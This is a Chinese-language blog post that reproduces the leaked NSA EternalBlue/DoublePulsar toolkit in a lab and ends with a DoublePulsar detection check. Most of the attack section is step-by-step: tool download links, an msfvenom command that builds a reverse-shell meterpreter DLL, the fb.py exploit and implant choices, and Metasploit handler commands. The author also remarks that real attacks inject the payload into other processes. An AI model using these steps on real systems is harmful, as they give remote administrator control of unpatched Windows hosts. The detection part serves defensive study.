# ShadowBroker释放的NSA工具部分（windows）fb.py复现和中招检查方法(勒索病毒原理) - 数据之美的博客 - CSDN博客
2017年05月14日 18:37:26[看穿数据之美](https://me.csdn.net/oppo62258801)阅读数：1131
## 工具下载
> 
1、Python2.6和pywin32安装包(注意都是32位的，不然会导致调用dll payload文件失败)：
[复现python和pywin32安装包](https://admin.gxhc520.cn/wp-content/uploads/2017/04/%E5%A4%8D%E7%8E%B0python%E5%92%8Cpywin32%E5%AE%89%E8%A3%85%E5%8C%85.7z) （分流下载：[http://pan.baidu.com/s/1jHKw0AU](http://pan.baidu.com/s/1jHKw0AU)
 密码：kuij）
2、Shadowbroker放出的NSA攻击工具
[https://github.com/misterch0c/shadowbroker](https://github.com/misterch0c/shadowbroker)
3、中招检查工具
[中招检查工具](https://admin.gxhc520.cn/wp-content/uploads/2017/04/%E4%B8%AD%E6%8B%9B%E6%A3%80%E6%9F%A5%E5%B7%A5%E5%85%B7.7z) （分流下载：[http://pan.baidu.com/s/1dETugox](http://pan.baidu.com/s/1dETugox)
 密码：una3）
注：检查工具已重写了（各有所需，你可以根据自己需要修改） 
## 一、 漏洞复现
### 1.    前期准备
攻击系统信息列表如下：
|IP|系统信息|用途|备注|
|----|----|----|----|
|192.168.0.102|Windows 7旗舰版|攻击机器|需安装python2.6.6&pywin32|
|192.168.0.104|Kali linux 2|用于生成攻击payload(反弹shell等)和控制反弹的shell会话|生成reverse shell 的dll|
|192.168.0.103|Windows xp p3|靶机|开启SMB服务，445端口(默认开启,默认防火墙已经过滤该类攻击，建议关闭系统防火墙后测试）|
在攻击机器中安装好[Python](http://lib.csdn.net/base/python) 2.6.6和pywin32,并设置好python的环境变量，以便我们在cmd中使用。
![](http://image.3001.net/images/20170416/14923452096195.png!small)
然后生成用于反弹shell的dll payload：
> 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=8089 -f dll > reverser_tcp.dll
![](http://image.3001.net/images/20170416/14923452223095.png!small)
在靶机上开启SMB服务（默认开启），查看服务是否生效，即看靶机上的445端口是否在监听（netstat -ano）：
![](http://image.3001.net/images/20170416/14923452328908.png!small)
### 2.    工具使用
在win 7攻击机器上cmd中切换到windows目录输入:python fb.py
![](http://image.3001.net/images/20170416/14923452442230.png!small)
创建攻击项目日志目录文件夹log_dirs并设置针对攻击目标192.168.0.103的攻击日志目录
然后输入：user eternalblue
一路回车直到需要选择对应的攻击系统，如下图：
![](http://image.3001.net/images/20170416/14923452513699.png!small)
选择1使用常规部署方式（也就是在靶机上建立后门的部署方式,带有模糊[测试](http://lib.csdn.net/base/softwaretest)）
然后一路回车到确认攻击目标信息。
接着使用use doublepulsar，然后一直回车直到如下图需要选择攻击的服务类型：
![](http://image.3001.net/images/20170416/14923452595425.png!small)
备注：作者截图错误，图中的192.168.0.105应为192.168.0.103
我们攻击的服务类型是SMB，所以输入0，但是如果下次攻击的远程登陆，即RDP的时候输入1
然后选择攻击系统的版本：
![](http://image.3001.net/images/20170416/14923453171495.png!small)
这里我们输入与靶机对应的系统版本，输入1.
然后，需要选择想执行的动作：
![](http://image.3001.net/images/20170416/14923453235336.png!small)
这里我们输入2，执行由kali [Linux](http://lib.csdn.net/base/linux) 2 msf生成的反弹shell的dll后门（放在C盘根目录）：
![](http://image.3001.net/images/20170416/14923453294458.png!small)
回到win 7 攻击机器上设置好对应的反弹shell 的dll文件（payload）路径。
![](http://image.3001.net/images/20170416/149234533893.png!small)
然后在Kali linux 2上运行msfconsole:
> 
 # msfconsole
msf > use exploit/multi/handler
msf > set LHOST 168.0.104
msf > set LPORT 8089
msf > set PAYLOAD windows/meterpreter/reverse_tcp
msf > exploit
效果如下图：
![](http://image.3001.net/images/20170416/14923453465186.png!small)
上图说明了msf在监听本地端口（看是否有反弹的shell返回,并控制反弹的shell会话）。
![](http://image.3001.net/images/20170416/14923453519557.png!small)
在输入完用于反弹shell的路径后，需要输入反弹shell需要注入的进程和命令行进程，由于已经有默认设置，我们直接回车就好了（当然，在真实攻击中，最好是注入到其他进程中）
回车后发现已在攻击机器上成功执行并反弹了shell到Kali linux2机器上：
![](http://image.3001.net/images/20170416/14923453573280.png!small)
看到已成功利用了（即获取到winxp 靶机的cmd 会话权限）：
![](http://image.3001.net/images/20170416/14923453653005.png!small)
成功控制靶机（能够以管理员权限控制住机器）：
![](http://image.3001.net/images/20170416/14923453724552.png%21small)
## 二、 中招检查方法
将中招检查工具转到想要检查的机器（需要python环境）上，通过cmd进入到工具所在目录：
![](http://image.3001.net/images/20170416/14923453782690.png%21small)
运行python detect_doublepulsar_by_c4td0g.py 进行检查(默认检查本地（127.0.0.1）：
![17.png](http://image.3001.net/images/20170416/14923473702698.png!small)
看到上图的DOUBLEPULSAR DETECTED!!!说明已经中招！
本次shadowbroker放出的工具影响情况如下：
![](http://image.3001.net/images/20170416/14923453857337.jpg!small)
## 三、 总结
1、有人说写这个工具的人（NSA的人）编程水平不咋地？   
2、有人说这是13年泄露的？   
3、有人说不会用！？
思考时间：   
1、很多东西实用就好，这是有针对性的;   
2、源码里已说是12年开发的（或许更早）;
![20170416201838.png](http://image.3001.net/images/20170416/14923451372624.png!small)
3、坐等大牛写文章;   
4、看了源码还有些目录不存在，说明还有戏看！   
5、NSA在12年就写出了这样的工具，现在他们有的工具是什么样的？
